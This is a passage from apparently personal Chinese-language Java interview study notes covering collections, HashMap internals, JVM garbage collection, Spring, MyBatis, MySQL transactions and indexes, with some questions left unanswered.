href="#十二、泛型中extends和super的区别" class="headerlink" title="十二、泛型中extends和super的区别"></a>十二、泛型中extends和super的区别</h3><ol><li><strong>&lt;? extends T&gt;</strong> 表示包括T在内的任何T的子类</li><li><strong>&lt;? super T&gt;</strong> 表示包括T在内的任何T的父类</li></ol><h3 id="十三、-和equals方法的区别"><a href="#十三、-和equals方法的区别" class="headerlink" title="十三、 ==和equals方法的区别"></a>十三、 ==和equals方法的区别</h3><ol><li><strong>==：</strong>如果是基本数据类型，比较的是值；如果是引用类型，比较的是引用地址</li><li><strong>equals：</strong>一般情况下和==没区别，他的底层就是==。但是在一些类中被重写了，比如string，虽然是引用类，但是比较的却是每个字符是否相等</li></ol><h3 id="十四、重载和重写的区别"><a href="#十四、重载和重写的区别" class="headerlink" title="十四、重载和重写的区别"></a>十四、重载和重写的区别</h3><ol><li><strong>重载：</strong>发生在同一个类中，方法名必须相同，参数类型不同、参数个数不同、顺序不同，方法返回值和访问修饰符可以不同，发生于编译时</li><li><strong>重写：</strong>发生于父子类中，方法名和参数必须相同，返回值范围不可大于父类，抛出异常的范围不可大于父类，访问修饰符范围大于或等于父类。若父类中该方法被private修饰，则不可被重写</li></ol><h3 id="十五、Set和List的区别"><a href="#十五、Set和List的区别" class="headerlink" title="十五、Set和List的区别"></a>十五、Set和List的区别</h3><ol><li><strong>List：</strong>有序，按对象进入的顺序保存对象，可重复，允许多个null元素对象，可以用迭代器进行遍历，也可以用get(index)来获取指定下标的元素</li><li><strong>Set：</strong>无序，不可重复，最多允许一个null元素对象。只可以用迭代器（Iterator）遍历</li></ol><h3 id="十六、-ArrayList和LinkList的区别"><a href="#十六、-ArrayList和LinkList的区别" class="headerlink" title="十六、 ArrayList和LinkList的区别"></a>十六、 ArrayList和LinkList的区别</h3><ol><li>首先底层结构不同，ArrayList采用数组实现，而linkedList采用链表来实现</li><li>因此，他们的应用场景不同，ArrayList更适合随机查找，linkedList更适合删除和添加</li><li>此外，虽然ArrayList和Linkedlist都实现了List接口，但是Linkedlist还额外实现了Deque接口，所以Linkedlist也可以当队列来使用</li></ol><h3 id="十七、谈谈ConcurrentHashMap的扩容机制"><a href="#十七、谈谈ConcurrentHashMap的扩容机制" class="headerlink" title="十七、谈谈ConcurrentHashMap的扩容机制"></a>十七、谈谈ConcurrentHashMap的扩容机制</h3><p>这个得分开来谈：</p><p>jdK1.7：</p><ol><li>基于segment对象分段实现</li><li>每个segment对象相当于一个小型的HashMap</li><li>每个segment对象内部会进行扩容，与HashMap类似</li><li>先生成新的数组，然后转移元素去新的数组</li></ol><p>jdk1.8：</p><ol><li>不再基于segment</li><li>当某个线程put时，如果发现concurrentHashMap在扩容，则一起扩容</li><li>如果线程put而concurrentHashMap没有扩容。则将key-value添加到concurrentHashMap中，判断是否超出阈值，超出则扩容</li><li>concurrentHashMap支持多线程同时扩容</li><li>扩容前也新生成一个数组，转移元素时，先将原数组分组，将每组分给不同线程来进行元素转移，每个线程负责一组或者多组元素的转移</li></ol><h3 id="十八、JDK1-7与JDK1-8的区别（详细描述HashMap的变化）"><a href="#十八、JDK1-7与JDK1-8的区别（详细描述HashMap的变化）" class="headerlink" title="十八、JDK1.7与JDK1.8的区别（详细描述HashMap的变化）"></a>十八、JDK1.7与JDK1.8的区别（详细描述HashMap的变化）</h3><ol><li>1.8的接口可以有static方法实现和default方法实现</li><li>JVM元空间替换永久代</li><li>lambda表达式</li><li>新增stream流</li><li>函数式接口</li><li>日期API和并发API</li><li>Switch支持string类型</li><li><p>HashMap底层变化：</p><ol><li>JDK1.7中底层为数组+链表，1.8中是数组+链表+红黑树，红黑树的加入提高了HashMap的插入和查询的整体效率</li><li>JDK1.7中链表使用头插法，JDK1.8中使用尾插法。因为JDK1.8中插入key-value时需要判断链表元素个数，所以需要遍历链表元素个数，所以正好采用尾插法</li><li>JDK1.7中哈希算法比较复杂，存在各种右移和异或运算，由于JDK1.8中引入了红黑树，所以对其做了适当简化，节省CPU资源</li></ol><p>​</p></li></ol><h3 id="十九、HashMap的put方法"><a href="#十九、HashMap的put方法" class="headerlink" title="十九、HashMap的put方法"></a>十九、HashMap的put方法</h3><p>先说说HashMap的Put方法的大体流程：</p><ol><li>根据key通过哈希算法运算得出数组下标</li><li>若数组下表位置为空，则将key-value封装为Entry对象（JDK1.7为Entry对象，JDK1.8为Node对象）并放入该位置</li><li><p>若不为空，则分开讨论：</p><ol><li>若为JDK1.7，则判断是否需要扩容，若不用扩容则生成Entry对象，并用头插法添加到当前位置的链表中</li><li><p>若为JDK1.8，则先判断当前位置上的Node类型，看是链表Node还是红黑树Node：</p><ol><li>如果是红黑树Node，则将key-value封装为一个红黑树节点并添加到红黑树中去，这个过程会判断红黑树中是否存在当前key，存在则更新value</li><li>如果是链表Node，则将key-value封装为Node插入链表最后，因为采用尾插法，所以需要遍历链表，在遍历链表时会判断key是否存在于当前链表中，存在则更新value，遍历完之后，将新链表Node插入到链表中，插入后会看当前链表的节点个数，大于等于8则将该链表转为红黑树</li><li>将key和value封装为Node插入红黑树或者链表中后，再判断是否扩容，需要就扩容。否则就结束Put方法</li></ol><p>​</p></li></ol></li></ol><h3 id="二十、深拷贝和浅拷贝"><a href="#二十、深拷贝和浅拷贝" class="headerlink" title="二十、深拷贝和浅拷贝"></a>二十、深拷贝和浅拷贝</h3><p>深拷贝和浅拷贝就是指对象的拷贝，一个对象中存在两种类型的属性，一种是基本数据类型，另一种是实例对象引用。</p><ol><li>浅拷贝是指只会拷贝基本数据类型的值，以及实例对象的引用地址，并不会复制一份引用对象地址所以指向的对象，也就是浅拷贝出来的对象内部的类属性指向的是同一个对象</li><li>深拷贝是指既会拷贝基本数据类型的值，也会针对实例对象的引用地址所指向的对象进行复制，深拷贝出来的对象，内部的属性指向的不是同一个对象</li></ol><h3 id="二十一、HashMap的扩容机制原理"><a href="#二十一、HashMap的扩容机制原理" class="headerlink" title="二十一、HashMap的扩容机制原理"></a>二十一、HashMap的扩容机制原理</h3><p>JDK1.7</p><ol><li>先生成数组</li><li>遍历老数组中的每个位置上的链表上的每个元素</li><li>取每个元素key，并基于新的数组长度，计算出每个元素在新数组中的下标</li><li>将元素添加到数组中去</li><li>所有元素转移完后，将新数组赋值给HashMap对象的table属性</li></ol><p>JDK1.8</p><ol><li>先生成新数组</li><li>遍历老数组中的每个位置上的链表或红黑树</li><li>如果是链表，则将链表中每个元素重新计算下标，并添加到新数组中去</li><li>如果是红黑树，则先遍历红黑树，先计算红黑树中每个元素对应新数组中的下标：<ol><li>统计每个下标位置元素个数</li><li>如果该下标的元素个数超过8，则生成新的红黑树，并将根节点添加到新数组对应位置</li><li>如果不超过8，则生成一个链表，并将其头节点添加到新数组的对应位置</li></ol></li><li>所有元素转移完成后，将新数组赋值给HashMap对象table属性</li></ol><h3 id="二十二、CopyOnWriteArrayList的底层原理"><a href="#二十二、CopyOnWriteArrayList的底层原理" class="headerlink" title="二十二、CopyOnWriteArrayList的底层原理"></a>二十二、CopyOnWriteArrayList的底层原理</h3><ol><li>首先CopyOnWriteArrayList内部也是通过数组来实现的，在向CopyOnWriteArrayList添加元素时，会复制一个新的数组，写操作在新数组上进行，读操作在原数组上进行</li><li>且写操作会加锁，防止出现并发写入丢失数据的问题</li><li>写操作结束之后会把原数组指定新数组</li><li>CopyOnWriteArrayList允许在写操作时来读取数据，极大的提高了读的性能，因此适合读多写少的场景，但是其比较占内存，同时可额能读到的数据不是实时数据，所以不适合实时性要求高的场景</li></ol><h3 id="二十三、为什么要实现序列化？如何实现序列化？"><a href="#二十三、为什么要实现序列化？如何实现序列化？" class="headerlink" title="二十三、为什么要实现序列化？如何实现序列化？"></a>二十三、为什么要实现序列化？如何实现序列化？</h3><ol><li>序列化：指把堆内存中的java对象数据，通过某种方式把对象存储到磁盘文件中或者传递给其他网络节点（在网络上传输），这个过程就是序列化。通俗来说就是将数据结构或者对象转换成二进制数据流的过程</li><li>反序列化：把磁盘文件中的数据对象或者把网络节点上的对象数据恢复成java对象模型的过程。也就是将在序列化过程中产生的二进制数据流转换成对象</li><li>​</li></ol><h3 id="二十四、java的异常体系"><a href="#二十四、java的异常体系" class="headerlink" title="二十四、java的异常体系"></a>二十四、java的异常体系</h3><ol><li>Java中所有异常都来自顶级父类Throwable</li><li>Throwable下面有两个子类Exception和Error</li><li>Error表示非常严重的错误，比如StackOverFlowError和OutOfMemoryError，通常这些错误出现时，仅仅想靠程序自己是解决不了的，可能是虚拟机、磁盘或者操作系统出了问题，这类异常不要去捕获。出现Exception则表示可以依靠程序解决，如NullPointException</li><li>Exception子类又分为RuntimeException和非RuntimeException</li><li>RuntimeException表示运行异常，是代码在运行中抛出的异常，一般由逻辑错误引起，应尽可能避免，常见如NullPointException</li><li>非RuntimeException表示非运行异常，常在编写代码时碰到，程序无法通过异常检测，如IOException</li></ol><h3 id="二十五、什么时候抛出异常？什么时候捕获异常？"><a href="#二十五、什么时候抛出异常？什么时候捕获异常？" class="headerlink" title="二十五、什么时候抛出异常？什么时候捕获异常？"></a>二十五、什么时候抛出异常？什么时候捕获异常？</h3><p>异常相当于一种提示，如果抛出异常，相当于告诉上层方法，“我抛了一个异常，我处理不了这个异常，交给你处理”，但是上层方法未必能解决异常，他可能也需要抛给更上层。</p><p>所以我们在写一个方法时，我们需要考虑的是本方法怎么合理处理异常，如果无法处理就上抛。一般在项目中，我个人倾向于在service层抛出异常，在controller层捕获异常</p><h3 id="二十六、Java中有哪些类加载器"><a href="#二十六、Java中有哪些类加载器" class="headerlink" title="二十六、Java中有哪些类加载器"></a>二十六、Java中有哪些类加载器</h3><p>JDK自带三个类加载器：bootstrap ClassLoader、ExtClassLoader、APPClassLoader</p><ol><li>bootstrap ClassLoader是ExtClassLoader的父加载器，默认负责加载%JAVA_HOME%lib下的jar包和class文件</li><li>ExtClassLoader是APPClassLoader的父类加载器，负责加载%JAVA_HOME%lib/ext文件夹下的jar包和class类</li><li>APPClassLoader是自定义类加载器的父类，负责加载classpath下的类文件</li></ol><h3 id="二十七、负载均衡的策略"><a href="#二十七、负载均衡的策略" class="headerlink" title="二十七、负载均衡的策略"></a>二十七、负载均衡的策略</h3><ol><li><strong>轮询：</strong>最基本的配置方法也是默认方法，每个请求会按时间顺序逐一分配到不同的后端服务器。<ol><li>在轮询中服务器down了，会自动剔除该服务器</li><li>缺省配置就是轮询策略</li><li>此策略适合服务器配置相当，无状态且短平快的服务使用</li></ol></li><li><strong>权重：</strong>在轮询策略的基础上指定轮询的几率<ol><li>权重越高分配到需求处理的请求越多</li><li>此策略可以和least_conn和ip_hash结合使用</li><li>此策略比较适合服务器差别比较大的情况</li></ol></li><li><strong>根据ip分配：</strong>指定负载均衡器按照客户端ip的分配方式，这个方法确保了相同的客户端请求一直发送到相同的服务器，以保证session会话。这样每个访客都固定访问一个后端服务器，可以解决session不能跨服务器的问题<ol><li>在nignx 1.3.1之前，不能在ip_hash中使用权重</li><li>ip_hash不能与backup同时使用</li><li>此策略适合有状态的服务，比如session</li><li>当有服务器需要剔除，必须手动dowm掉</li></ol></li><li><strong>最少连接：</strong>把请求发给连接数最少的服务器。轮询算法是把请求平均发给各个后端，使他们的负载大致相同；但是有些请求占用的时间很长，会导致其所在的后端负载较高。<ol><li>此负载均衡策略适合请求处理时间长短不一造服务器过载的情况。</li></ol></li><li><strong>响应时间（不需要掌握）：</strong>这是第三方策略，需要安装插件。这个就是按服务器的响应时间来分配请求，响应时间短的优先分配</li><li><strong>根据URL分配方式（不需要掌握）：</strong>这是第三方策略，需要安装插件。按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，要配合缓存命中来使用。同一个资源多次请求，可能会到达不同的服务器上，导致不必要的多次下载，缓存命中率不高，以及一些资源时间的浪费。而使用url_hash，可以使得同一个url（也就是同一个资源请求）会到达同一台服务器，一旦缓存住了资源，再此收到请求，就可以从缓存中读取。　</li></ol><h3 id="二十八、IO流的分类"><a href="#二十八、IO流的分类" class="headerlink" title="二十八、IO流的分类"></a>二十八、IO流的分类</h3><ol><li>按数据流的方向：输入流、输出流</li><li>按处理数据单位：字节流、字符流</li><li>按功能：节点流、处理流</li></ol><h3 id="二十九、Java-IO流有什么特点"><a href="#二十九、Java-IO流有什么特点" class="headerlink" title="二十九、Java IO流有什么特点"></a>二十九、Java IO流有什么特点</h3><h3 id="三十、resource和autowired的区别"><a href="#三十、resource和autowired的区别" class="headerlink" title="三十、resource和autowired的区别"></a>三十、resource和autowired的区别</h3><ol><li>都是用来实现自动装配</li><li>@Resource只能用在属性上，默认按照名称匹配，如果没有找到匹配名称的bean，则按类型匹配。是java标准库自带注解</li><li>@Autowired可以用在属性、构造器、方法上，默认按类型匹配，也可以通过@Qualifier指定具体bean，是Spring框架自带的注解</li><li>但是这两种方法都不被官方推荐，官方不推荐属性注入的方式。他们更倾向于构造器方式注入,可以有效提高性能，但是代码需要加final关键字。但是同一在相关服务类加上lombok中的@RequidArgsConstructor注解自动生成构造器，减少代码量</li></ol><h3 id="三十一、Spring-MVC的执行流程"><a href="#三十一、Spring-MVC的执行流程" class="headerlink" title="三十一、Spring MVC的执行流程"></a>三十一、Spring MVC的执行流程</h3><p><strong>什么是MVC？MVC是Model、view、controller的缩写：</strong></p><ol><li>Model（模型）：数据模型吗，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或JavaBean组件。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务</li><li>View（视图）：负责进行模型的展示，一般是我们见到的用户界面，给客户看到的东西</li><li>Controller（控制器）：接受用户请求，委托给模型进行处理（状态改变），处理完毕后把返回的模型数据返回给视图，由视图负责展示。也就是说控制器起调度作用</li></ol><p><strong>spring MVC的执行流程</strong>：</p><ol><li>用户发起HTTP请求，请求直接到前端控制器DispatcherServlet</li><li>前端控制器接收请求后调用处理器映射器HandlerMapping，处理器映射器根据请求的URL找到具体Handler，并返回给前端控制器</li><li>前端控制器会调用处理器适配器HandlerAdapter去适配调用Handler</li><li>处理器适配器会根据Handler调用真正的处理器去处理请求，并且处理对应的业务逻辑</li><li>当处理器处理完业务之后，会返回一个ModelAndView对象给处理器适配器，HandlerAdapter再将该对象返回给前端控制器；这里的Model是返回的数据对象，View是逻辑上的view</li><li>前端控制器DispatcherServlet将返回的ModelAndView对象传给视图解析器ViewResolver进行解析，解析完成后会返回一个具体的视图View给前端控制器（ViewResolver根据逻辑的View查找具体的View）</li><li>前端控制器DispatcherServlet将具体的视图进行渲染呈现给用户</li></ol><h3 id="三十二、怎么确定一个对象到底是不是垃圾（暂时不管这题）"><a href="#三十二、怎么确定一个对象到底是不是垃圾（暂时不管这题）" class="headerlink" title="三十二、怎么确定一个对象到底是不是垃圾（暂时不管这题）"></a>三十二、怎么确定一个对象到底是不是垃圾（暂时不管这题）</h3><h3 id="三十三、JVM有哪些垃圾回收算法"><a href="#三十三、JVM有哪些垃圾回收算法" class="headerlink" title="三十三、JVM有哪些垃圾回收算法"></a>三十三、JVM有哪些垃圾回收算法</h3><ol><li>标记清除算法：<ol><li>标记阶段：把垃圾内存标记出来</li><li>清除阶段：直接将垃圾内存回收</li><li>此算法较为简单，但是会产生大量内存碎片</li></ol></li><li>复制算法：为解决标记清除法的内存碎片问题而诞生。复制算法将内存分为大小相等的两半，每次只使用其中一般。垃圾回收时，将当前这一块的存活对象全部拷贝到另一半，然后当前这一班内存直接清除。这种算法没有内存碎片，但是很浪费空间，而且，他的效率跟存活对象个数有关</li><li>标记压缩算法：为了解决赋值算法的缺陷，就提出了标记压缩算法，此算法在标记阶段跟标记清除算法是一样的，但是在完成标记之后，不是直接清除垃圾内存，而是将存活对象往一段移动，然后将边界以外的全部清除</li></ol><h3 id="三十四、什么是STW"><a href="#三十四、什么是STW" class="headerlink" title="三十四、什么是STW"></a>三十四、什么是STW</h3><p>就是stop-the-world，是在垃圾回收算法执行过程中，需要将JVM内存冻结的一种状态。在STW状态下，java所有线程都是停止执行的（GC线程除外）。</p><h3 id="三十五、常用JVM启动参数有哪些"><a href="#三十五、常用JVM启动参数有哪些" class="headerlink" title="三十五、常用JVM启动参数有哪些"></a>三十五、常用JVM启动参数有哪些</h3><p>大致可以分为三类：</p><ol><li>标注指令： -开头，这些是所有的HotSpot都支持的参数，可以用java -help打印出来</li><li>非标准指令： -X开头，这些指令通常是跟特定的HotSpot版本对应的，可以用java -X打印出来</li><li>不稳定参数： -XX开头，这一类参数跟特定的HotSpot版本对应，并且变化非常大</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 设置堆内存</span><br><span class="line">-Xmx4g  -Xms4g</span><br><span class="line"># 指定GC算法</span><br><span class="line">-XX:+UseG1GC  -XX:MaxGCPauseMillis=<span class="number">50</span></span><br><span class="line"># 指定GC并行线程数</span><br><span class="line">-XX:ParallelGCThreads=<span class="number">4</span></span><br><span class="line"># 打印GC日志</span><br><span class="line">-XX:+PrintGCDetails  -XX:+PrintGCDateStamps</span><br><span class="line"># 指定GC日志文件</span><br><span class="line">-Xloggc:gc.log</span><br><span class="line"># 指定Meta区的最大值</span><br><span class="line">-XX:MaxMetaspaceSize=2g</span><br></pre></td></tr></table></figure><h3 id="三十六、说说对线程安全的理解"><a href="#三十六、说说对线程安全的理解" class="headerlink" title="三十六、说说对线程安全的理解"></a>三十六、说说对线程安全的理解</h3><p>线程安全指，我们写的某段代码，在多个线程同时执行这段代码时，不会产生混乱，依然能得到正常结果。例如i++就是不安全的</p><p>三十七、对守护线程的理解</p><p>三十八、JVM问题排查</p><h3 id="三十九、并发、并行、串行之间的区别"><a href="#三十九、并发、并行、串行之间的区别" class="headerlink" title="三十九、并发、并行、串行之间的区别"></a>三十九、并发、并行、串行之间的区别</h3><ol><li>串行：一个任务执行完才能执行下一个任务</li><li>并行：两个任务同时执行</li><li>并发：两个任务整体看上去是同时执行的，但是在底层，两个任务被拆分成很多分，然后一个个执行，但是宏观层面上两个任务是同时执行的</li></ol><h3 id="四十、JAVA如何避免死锁"><a href="#四十、JAVA如何避免死锁" class="headerlink" title="四十、JAVA如何避免死锁"></a>四十、JAVA如何避免死锁</h3><p>造成死锁的原因：</p><ol><li>一个资源每次只能被一个线程使用</li><li>一个线程在阻塞等待某个资源是，不释放已占有资源</li><li>一个线程已经获得的资源，在未使用完之前，不能进行强行剥夺</li><li>若干线程形成了收尾相连循环等待资源的关系</li></ol><p>这是造成死锁所必须的4个条件，如果想避免死锁，只要不满足其中之一即可。在研发过程中：</p><ol><li>要注意加锁顺序，保证每个线程安同样顺序进行加锁</li><li>要注意加锁的时限，可以针对锁设置一个超时时间</li><li>注意死锁检查，确保第一时间发现死锁并解决</li></ol><p>四十一、线程池底层工作原理</p><p>四十二、线程池为什么是先添加队列而不是先创建最大线程</p><p>四十三、ReentrantLock中tryLock()和Lock()方法的区别</p><p>四十四、谈谈对AQS的理解，AQS如何实现可重入锁？</p><h3 id="四十五、谈谈对于IOC的理解（后期要修改）"><a href="#四十五、谈谈对于IOC的理解（后期要修改）" class="headerlink" title="四十五、谈谈对于IOC的理解（后期要修改）"></a>四十五、谈谈对于IOC的理解（后期要修改）</h3><p>在 Spring 中，控制反转指的是将对象的控制权转移给 Spring 框架进行管理，由 Spring 帮我们创建对象，管理对象之间的依赖关系</p><p>以前创建对象的主动权和时机都是由自己把控的，现在由 IOC 容器来做，在很大程度上简化了应用的开发</p><p>IOC 容器实际上就是一个 Map 的键值对，Map 里面存放的是各种对象。IOC 容量就像一个工厂一样，当我们需要创建对象的时候，只需要通过 xml 配置文件或者注解，把对象注册到组件中，而我们完全不用考虑对象是如何被创建出来的。其中，IOC 的最常见以及最合理的实现方式叫做依赖注入（DI）</p><h3 id="四十六、谈谈对于AOP的理解"><a href="#四十六、谈谈对于AOP的理解" class="headerlink" title="四十六、谈谈对于AOP的理解"></a>四十六、谈谈对于AOP的理解</h3><p>AOP，也就是面向切面编程，可以让我们将程序的特定功能从主业务逻辑中分离出来，从而让代码更清晰，更容易维护。有利于提高代码的可读性和重复利用性，并且可以帮助我们处理复杂应用程序中的共同功能，比如日志记录、安全性、事务处理和异常处理等。</p><p>四十七、单例Bean和单例模式</p><h3 id="四十八、Spring事务传播机制"><a href="#四十八、Spring事务传播机制" class="headerlink" title="四十八、Spring事务传播机制"></a>四十八、Spring事务传播机制</h3><ol><li>REQUIRED（Spring默认的事务传播类型）：如果当前没有事务，则自己新建一个事务，如果当前存在事务，则加入这个事务</li><li>SUPPORTS：当前存在事务，则加入当前事务，如果没有，则以非事务方法执行</li><li>MANDATORY：当前存在事务，就加入当前事务；不存在就抛出异常</li><li>REQUIRED_NEW：创建一个新事务，如果存在当前事务，则挂起该事务</li><li>NOT_SUPPORTED：以非事务方式执行，如果当前存在事务，则挂起当前事务</li><li>NEVER：不使用事务，如果当前事务存在，则抛出异常</li><li>NESTED：如果当前事务存在，则嵌套在事务中执行，否则开启一个事务</li></ol><h3 id="四十九、Spring事务什么时候会失效"><a href="#四十九、Spring事务什么时候会失效" class="headerlink" title="四十九、Spring事务什么时候会失效"></a>四十九、Spring事务什么时候会失效</h3><p>Spring事务的原理是AOP，进行了切面增强，那么失效的原因就是AOP不起作用了，常见有以下几种：</p><ol><li>发生自调用，类里面使用this调用本类的方法（this通常省略），此时这个this对象不是代理对象，而是当前类对象。解决方法就是让this变为当前对象的代理类</li><li>方法不是public的：@Transactiional只能用于public方法上，否则事务不会失效，如果用在非Public方法上，可以开启Aspectj代理模式</li><li>数据库不支持事务</li><li>没有被Spring管理</li><li>异常被吃掉，事务不会回滚（或者抛出的异常没有被定义，默认为RuntimeException）</li></ol><h3 id="五十、Spring中Bean是线程安全的吗"><a href="#五十、Spring中Bean是线程安全的吗" class="headerlink" title="五十、Spring中Bean是线程安全的吗"></a>五十、Spring中Bean是线程安全的吗</h3><p>Spring本身没有针对Bean做线程安全处理，所以</p><ol><li>如果Bean是无状态，那么Bean是线程安全的</li><li>如果Bean是有状态的，那么就是不安全的</li></ol><p>另外，Bean是不是线程安全，跟Bean的作用域没有关系，Bean的作用域只是表示Bean的生命周期，对于任何生命周期Ban都是一个对象个，这个对象是不是线程安全的，还得看这个对象本身</p><h3 id="五十一、Spring中Bean创建的生命周期有哪些步骤"><a href="#五十一、Spring中Bean创建的生命周期有哪些步骤" class="headerlink" title="五十一、Spring中Bean创建的生命周期有哪些步骤"></a>五十一、Spring中Bean创建的生命周期有哪些步骤</h3><p>Spring中一个Bean的创建大概为以下几步：</p><ol><li>推断构造方法</li><li>实例化</li><li>填充属性，也就是依赖注入</li><li>处理Aware回调</li><li>初始化前，处理@PostConstruct注解</li><li>初始化，处理InitialZingBean接口</li><li>初始化后，进行AOP</li></ol><p>五十二、ApplicationContext和BeanFactory有什么区别</p><p>五十三、Spring中事务是如何实现的</p><p>五十四、Spring中@Transational什么时候会失效</p><p>五十五、Spring容器的启动流程</p><h3 id="五十六、Spring用到了那些设计模式"><a href="#五十六、Spring用到了那些设计模式" class="headerlink" title="五十六、Spring用到了那些设计模式"></a>五十六、Spring用到了那些设计模式</h3><ol><li>工厂模式：FactoryBean和BeanFactory</li><li>原型模式：原型Bean</li><li>单例模式：单例Bean</li><li>构造器模式：StringBuilder就是典型的</li><li>适配器模式：在Spring执行流程中有</li><li>代理模式：AOP就是典型的代理</li></ol><h3 id="五十七、Spring的优点"><a href="#五十七、Spring的优点" class="headerlink" title="五十七、Spring的优点"></a>五十七、Spring的优点</h3><ol><li>低侵入式设计，降低代码之间的耦合</li><li>独立于各种应用服务器，基于Sping框架的应用，可以真正实现一次编写多次使用</li><li>容器提供单例模式支持，开发者不用再自己编写代码实现</li><li>提供AOP技术，可以将一些通用任务，比如安全、事务、日志等进行集中式管理，更好的复用</li><li>ORM和DAO提供了与第三方持久层框架的良好整合，并简化了底层的数据库访问</li><li>Spring并不强制应用完全依赖于Spring，开发者可以自由的选择使用Spring框架的全部或者部分</li></ol><p>五十八、Spring常用注解及其底层实现</p><p>五十九、SpringBoot如何启动Tomcat</p><h3 id="六十、Mybatis的优缺点"><a href="#六十、Mybatis的优缺点" class="headerlink" title="六十、Mybatis的优缺点"></a>六十、Mybatis的优缺点</h3><p>优点：</p><ol><li>基于SQL语句编程，相当灵活，不会对应用程序或者数据库的现有设计造成影响，SQL写在XML中，解除了Sql与程序代码的耦合，便于统一管理</li><li>与JDBC相比，减少大量代码量，不需要手动开关连接</li><li>只要JDBC支持的数据库，Mybatis都支持，所以支持各种数据库</li><li>和Spring集成方便</li><li>提供映射标签，支持对象与数据库的ORM字段关系映射</li></ol><p>缺点：</p><ol><li>SQL语句编写工作量大，在连表查询的时候会有些复杂</li><li>SQl语句依赖数据库，导致数据库移植性差，不能随意更换数据库</li></ol><h3 id="六十一、Mybatis中-和-的区别是什么"><a href="#六十一、Mybatis中-和-的区别是什么" class="headerlink" title="六十一、Mybatis中${}和#{}的区别是什么"></a>六十一、Mybatis中${}和#{}的区别是什么</h3><ol><li>·#{}·是预编译处理、是占位符，${}是字符串替换，是替换符</li><li>Mybatis在处理#{}时，会将SQL中的#{}替换成？号，调用PreparedStatement来赋值</li><li>Mybatis处理${}时，就是把其替换成变量的值，调用Statement来赋值</li><li>·#{}·可以有效预防SQL注入，提高系统安全。而${}不行</li></ol><h3 id="六十二、索引的基本原理"><a href="#六十二、索引的基本原理" class="headerlink" title="六十二、索引的基本原理"></a>六十二、索引的基本原理</h3><p>索引用来快速的寻找那些具有特定值的记录，如果没有索引，一般来说，执行查询时遍历整张表</p><p>把无序的数据变成有序的查询</p><ol><li>把创建了索引的列的内容进行排序</li><li>对排序结果生成倒排表</li><li>在倒排表内容上拼上数据链</li><li>在查询内容时，先拿到倒排表内容，再取出数据地址链，从而拿到数据</li></ol><h3 id="六十三、kafka的特点"><a href="#六十三、kafka的特点" class="headerlink" title="六十三、kafka的特点"></a>六十三、kafka的特点</h3><ol><li><p>解耦合：</p><p>耦合的状态表示当你实现新功能时，是直接接入当前接口，可以将相应消息发送到消息队列，这样的话，如果接口出问题，将不会影响到当前的功能</p></li><li><p>异步处理：</p><p>异步处理替代了之前的同步处理，异步处理不需让流程走完就返回结果，可以将消息发送到消息队列中，然后返回结果，剩下让其他业务处理，接口从消息队列中拉去消息处理即可</p></li><li><p>流量削峰</p><p>高流量的时候，使用消息队列作为中间件可以将流量的高峰保存在消息队列中，从而防止系统的高请求</p></li></ol><h3 id="六十四、事务的基本特性和隔离级别"><a href="#六十四、事务的基本特性和隔离级别" class="headerlink" title="六十四、事务的基本特性和隔离级别"></a>六十四、事务的基本特性和隔离级别</h3><p>ACID：</p><ol><li>原子性：不可再分割</li><li>一致性：要么全部成功要么全部失败</li><li>隔离性：一个事务的修改在最终提交前，对其他事务是不可见的</li><li>持久性：一旦提交，所做的修改将被永远保存到数据库中</li></ol><p>四个隔离级别：</p><ol><li>read uncommit 读未提交：可能读到其他事务未提交数据，也叫脏读</li><li>read commit 读已提交：两次读取结果不一致，叫不可重复读。解决了脏读的问题，他只会读已提交的事务</li><li>repeatable read可重复读：这是mysql的默认级别，每次读取结果都一样，可能产生幻读</li><li>serializable 串行：一般不会使用，她会给没一行读取的数据加锁，会消耗大量资源</li></ol><h3 id="六十五、拦截器和过滤器的区别"><a href="#六十五、拦截器和过滤器的区别" class="headerlink" title="六十五、拦截器和过滤器的区别"></a>六十五、拦截器和过滤器的区别</h3><ol><li><p>拦截器是基于java的反射机制的，而过滤器是基于函数回调</p></li><li><p>拦截器不依赖于servlet容器，过滤器依赖于servlet容器</p></li><li><p>拦截器只能对action请求起作用，过滤器则可以对所有请求起作用</p></li><li><p>拦截器可以访问action上下文、值栈里的对象，而过滤器不能</p></li><li><p>在action周期里，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次</p><p>​</p></li></ol><p>六十六、Innodb是如何实现事务的</p><h3 id="六十七、B树和B-树的区别，为什么Mysql使用B-树"><a href="#六十七、B树和B-树的区别，为什么Mysql使用B-树" class="headerlink" title="六十七、B树和B+树的区别，为什么Mysql使用B+树"></a>六十七、B树和B+树的区别，为什么Mysql使用B+树</h3><p>B数的特点：</p><ol><li>节点排序</li><li>一个节点可以存多个元素，多个元素也排序了</li></ol><p>B+树的特点：</p><ol><li>拥有B树的特点</li><li>叶子结点之间有指针</li><li>非叶子结点上的元素在叶子节点都冗余了，也就是叶子节点中存储了所有的元素，并且排好顺序</li></ol><p>Mysql索引使用的是B+树，因为索引是用来加快查询的，而B+树通过对数据进行排序所以是可以提高查询速度的，然后通过一个节点中可以存储多个元素，从而可以使得B+树的高度不会太高，在Mysql中一个Innodb页就是一个B+树节点，一个Innodb页默认16kb，所以一般情况下，一颗两层的B+树可以存200万行左右的数据，然后通过利用B+树叶子节点存储了所有的数据，并且叶子节点之间有指针，可以很好的支持全表扫描，范围查找等SQL</p><h3 id="六十八、Mysql锁有哪些"><a href="#六十八、Mysql锁有哪些" class="headerlink" 